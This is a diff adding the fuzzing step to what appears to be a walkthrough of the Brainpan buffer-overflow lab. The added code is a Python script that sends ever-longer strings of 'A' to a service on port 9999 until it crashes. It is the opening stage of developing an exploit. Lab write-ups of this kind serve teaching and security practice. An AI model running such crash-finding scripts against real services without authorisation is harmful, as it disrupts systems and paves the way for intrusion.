@@ -42,5 +42,29 @@ In programming and software development, fuzzing or fuzz testing is an automated
 ## Step 1 Fuzzing <br />
 ### The Following Python Script is Useed to Fuzz The brainpan.exe service <br />
 
+```
+import socket
+import sys
+import time
 
+IP="192.168.94.131"
+
+i=100
+while True:
+	try:
+		with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as c:
+			c.settimeout(5)
+			c.connect((IP,9999))
+			c.recv(9999999)
+			string="A"*i
+			c.send(bytes(string+" \r\n",'utf-8'))
+			print("[+]"+str(i)+" Bytes Sent..!")
+			time.sleep(1)
+			c.recv(9999999)
+
+	except:
+		print("[!]Crashed at "+str(i)+" Bytes")
+		sys.exit(0)
+	i=i+100
+```
 
